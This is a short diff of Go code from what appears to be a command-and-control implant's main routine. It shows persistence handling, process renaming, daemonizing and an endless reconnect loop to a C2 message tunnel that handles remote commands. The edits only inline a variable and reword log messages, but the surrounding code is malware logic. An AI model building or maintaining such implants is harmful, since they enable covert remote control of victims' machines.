@@ -67,8 +67,7 @@ func agent_main() {
 		persistence = true
 	}
 
-	do_not_touch_argv := is_dll
-	renameProcessIfNeeded(persistence, do_not_touch_argv)
+	renameProcessIfNeeded(persistence, is_dll)
 	exe_path := util.ProcExePath(os.Getpid())
 	daemonizeIfNeeded(verbose, is_dll, exe_path)
 
@@ -307,9 +306,9 @@ connect:
 		goto connect
 	}
 	def.KCPKeep = true
-	log.Println("Connecting to CC MsgTun...")
+	log.Println("Connecting to CC message tunnel...")
 	c2transport.CCMsgTun(handler.HandleC2Command, ctx, cancel)
-	log.Printf("CC MsgTun closed, reconnecting")
+	log.Printf("CC message tunnel closed, reconnecting")
 	goto connect
 }
 
